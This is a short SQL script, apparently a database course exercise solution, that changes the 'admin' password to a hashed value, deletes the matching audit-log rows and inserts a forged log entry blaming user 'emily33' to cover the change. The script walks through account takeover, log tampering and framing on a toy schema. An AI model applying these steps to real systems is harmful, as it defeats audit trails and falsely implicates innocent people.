-- Alter the password of the website’s administrative account, admin, to instead be “oops!”.
UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

-- Erase any logs of the above password change recorded by the database.
DELETE FROM "user_logs"
WHERE "new_password" = '982c0381c279d139fd221fce974916e7';

--Add false data to throw others off your trail.
INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
SELECT 'update' , 'admin', 'emily33', (
	select "password" FROM "users"
	WHERE "username" = 'admin'
), (
        select "password" FROM "users"
        WHERE "username" = 'emily33'
);
